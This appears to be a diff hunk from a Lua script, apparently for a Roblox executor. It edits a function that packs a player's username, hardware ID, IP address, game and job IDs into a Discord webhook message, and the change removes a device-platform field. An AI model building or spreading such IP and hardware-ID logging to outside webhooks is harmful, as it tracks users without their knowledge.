@@ -58,11 +58,6 @@ local function SendMessage(url, Username, HWID, Executor, IP, GameID, JobID, Cou
             value = "Executor: **" .. Executor .. "**\nGame ID: **" .. tostring(GameID) .. "**\nJob ID: **" .. JobID .. "**",
             inline = true
         },
-        {
-            name = "💻 **Device Platform**",
-            value = "Platform: **" .. Platform .. "**",  -- Shows if the player is on PC or Mobile
-            inline = true
-        }
     }
 
     -- JSON Payload for Discord Webhook
